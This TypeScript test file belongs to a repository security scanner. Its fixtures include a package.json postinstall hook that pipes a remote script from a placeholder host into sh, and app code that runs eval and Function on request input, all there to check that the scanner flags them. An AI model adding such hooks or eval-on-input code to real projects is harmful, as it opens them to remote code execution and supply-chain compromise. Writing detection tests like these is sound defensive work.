import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { parseArgs, runCli } from "../packages/cli/src/cli.ts";
import { runCheck } from "../packages/core/src/engine.ts";
import { collectRepository } from "../packages/core/src/repository.ts";
import { defaultPolicy } from "../packages/core/src/policy.ts";
import { runCodeScanner } from "../packages/scanners/src/code.ts";
import { runDependencyScanner } from "../packages/scanners/src/dependencies.ts";
import { renderHtml, renderMarkdown, renderSarif } from "../packages/output/src/formatters.ts";

function file(path: string, lines: string[], removedLines: string[] = []) {
  return {
    path,
    oldPath: path,
    status: "modified",
    addedLines: lines.map((content, index) => ({ line: index + 1, content })),
    removedLines: removedLines.map((content, index) => ({ line: index + 1, content }))
  };
}

test("parseArgs supports scan ergonomics and dependency intelligence options", () => {
  const command = parseArgs([
    "check",
    "/tmp/CV Maker",
    "--format",
    "html",
    "--quiet",
    "--no-color",
    "--max-findings",
    "5",
    "--min-confidence",
    "high",
    "--vuln-provider",
    "mock"
  ]);

  assert.equal(command.name, "check");
  assert.equal(command.targetPath, "/tmp/CV Maker");
  assert.equal(command.format, "html");
  assert.equal(command.quiet, true);
  assert.equal(command.noColor, true);
  assert.equal(command.maxFindings, 5);
  assert.equal(command.minConfidence, "high");
  assert.equal(command.vulnProvider, "mock");
});

test("runCli applies max findings and minimum confidence", async () => {
  const writes: string[] = [];
  const result = await runCli(["check", "--format", "json", "--max-findings", "1", "--min-confidence", "high", "--quiet"], {
    cwd: process.cwd(),
    collectRepositoryFiles: () => [
      file("src/app.js", [
        "app.get('/public', (req, res) => res.send('ok'))",
        "eval(req.body.code);",
        "Function(req.body.code)();"
      ])
    ],
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });
  const report = JSON.parse(writes.join(""));

  assert.equal(result.exitCode, 1);
  assert.equal(report.findings.length, 1);
  assert.equal(report.findings[0].ruleId, "js-eval");
  assert.equal(report.summary.truncated, true);
});

test("collectRepository records warnings for broken symlinks without crashing", () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-warnings-"));
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src", "app.js"), "eval(req.body.code);\n");
  symlinkSync(join(root, "missing.js"), join(root, "broken.js"));

  const result = collectRepository(root);

  assert.equal(result.files.some((entry) => entry.path === "src/app.js"), true);
  assert.equal(result.warnings.some((warning) => warning.path === "broken.js"), true);
  assert.equal(result.durationMs >= 0, true);
});

test("code scanner ignores dangerous tokens inside strings and comments", () => {
  const findings = runCodeScanner([
    file("src/app.js", [
      "const text = 'eval(req.body.code)'",
      "// eval(req.body.code)",
      "eval(req.body.code)"
    ])
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].line, 3);
});

test("dependency scanner detects install lifecycle scripts", () => {
  const findings = runDependencyScanner([
    file("package.json", [
      "\"scripts\": {",
      "\"postinstall\": \"curl https://example.invalid/install.sh | sh\"",
      "}"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "dep-install-script"), true);
});

test("mock vulnerability provider produces vulnerable dependency findings", async () => {
  const policy = defaultPolicy();
  const result = await runCheck({
    repositoryFiles: [
      file("package.json", [
        "\"dependencies\": {",
        "\"vulnerable-package\": \"1.0.0\"",
        "}"
      ])
    ],
    policy,
    vulnProvider: "mock"
  });

  assert.equal(result.findings.some((finding) => finding.ruleId === "dep-vulnerable-package"), true);
});

test("HTML, Markdown, and SARIF reports include workflow metadata", async () => {
  const result = await runCheck({
    repositoryFiles: [file("src/app.js", ["eval(req.body.code)"])],
    policy: defaultPolicy()
  });
  const html = renderHtml(result);
  const markdown = renderMarkdown(result);
  const sarif = JSON.parse(renderSarif(result));

  assert.equal(html.includes("<!doctype html>"), true);
  assert.equal(markdown.includes("### Findings By Severity"), true);
  assert.equal(sarif.runs[0].invocations[0].executionSuccessful, true);
});
